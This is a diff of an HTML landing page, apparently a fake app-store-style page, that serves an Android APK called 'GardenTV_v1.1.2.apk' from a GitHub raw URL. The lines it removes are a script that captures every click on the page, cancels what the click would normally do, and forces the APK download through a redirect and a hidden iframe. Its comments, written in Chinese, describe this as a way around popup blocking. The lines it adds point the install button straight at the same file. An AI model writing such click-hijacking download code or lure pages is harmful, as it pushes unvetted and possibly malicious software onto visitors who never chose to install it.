@@ -259,7 +259,7 @@ margin-bottom: 24px;
             </div>
         </div>
         <!-- Install button in the middle of the page -->
-        <div class="main-install-btn" onclick="startDownload()">Instalar</div>
+        <a href="https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"><div class="main-install-btn">Instalar</div></a>
 
         <!-- Operation bar -->
         <div class="action-row">
@@ -461,41 +461,5 @@ margin-bottom: 24px;
         </div>
 
     </main>
-
-    <!-- Any click triggers download logic + prevents default redirection -->
-	<script>
-        // 定义下载链接变量，方便修改
-        const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
-
-        function startDownload() {
-            console.log("启动下载任务...");
-            
-            // 核心优化：使用 window.location.href 绕过弹窗拦截
-            window.location.href = apkUrl;
-            
-            // 备用方案（如果上面失效，尝试创建一个隐藏的 iframe 强制下载）
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = apkUrl;
-                document.body.appendChild(iframe);
-			// 清理 DOM	
-                setTimeout(() => {
-                    document.body.removeChild(iframe);
-                }, 1000);
-            }, 500);
-        }
-
-        // 监听全屏点击 (捕获阶段)
-        document.addEventListener('click', function(e) {
-            // 阻止页面上任何元素的默认行为（防止链接跳转、防止按钮刷新等）
-            e.preventDefault(); 
-            e.stopPropagation(); 
-            
-            // 用户主动点击触发下载是最高优先级的，浏览器绝对不会拦截
-            console.log("用户点击触发下载");
-            startDownload();
-        }, true);
-    </script>
 </body>
 </html>
